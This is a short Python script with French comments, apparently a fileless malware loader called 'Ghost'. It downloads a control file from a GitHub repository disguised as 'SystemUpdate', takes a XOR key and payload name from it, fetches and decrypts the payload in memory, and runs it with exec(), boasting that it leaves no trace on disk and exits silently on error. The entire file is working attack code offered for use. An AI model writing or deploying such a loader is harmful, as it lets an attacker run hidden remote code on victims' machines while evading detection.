import requests, os, sys

# --- CONFIGURATION SERVEUR GHOST ---
# Lien direct vers ton fichier de contrôle sur GitHub [cite: 2025-08-28]
URL_CONTROL = "https://raw.githubusercontent.com/mendrikarndrianarisolo-star/SystemUpdate/refs/heads/main/control.txt"

def start_ghost():
    try:
        # 1. Récupération de la clé XOR et du nom du payload
        r = requests.get(URL_CONTROL, timeout=10)
        if r.status_code != 200: return
        
        # Le format attendu dans control.txt est : CLE_XOR|nom_du_fichier.dat
        key, filename = r.text.strip().split('|')
        
        # 2. Construction de l'URL du payload et téléchargement en mémoire
        base_url = URL_CONTROL.rsplit('/', 1)[0] + "/"
        p_data = requests.get(base_url + filename, timeout=15).content
        
        # 3. Déchiffrement XOR "Ghost" (ne laisse aucune trace sur le disque) [cite: 2025-08-28]
        decrypted = bytearray(p_data[i] ^ ord(key[i % len(key)]) for i in range(len(p_data)))
        
        # 4. Exécution directe du code Python déchiffré
        exec(decrypted.decode('utf-8'), globals())
        
    except Exception:
        # Sortie discrète en cas d'erreur
        sys.exit()

if __name__ == "__main__":
    start_ghost()
